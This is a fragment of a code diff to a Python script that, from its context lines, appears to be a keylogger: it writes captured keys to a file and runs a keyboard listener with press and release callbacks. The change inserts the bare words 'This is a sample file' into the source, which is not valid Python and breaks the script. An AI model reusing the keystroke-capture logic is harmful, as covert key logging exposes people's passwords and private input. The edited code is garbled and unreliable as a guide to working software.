@@ -33,7 +33,11 @@ def write_file(keys):
                 f.write(k)
 
 
-
+This
+is
+a
+sample
+file
 
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
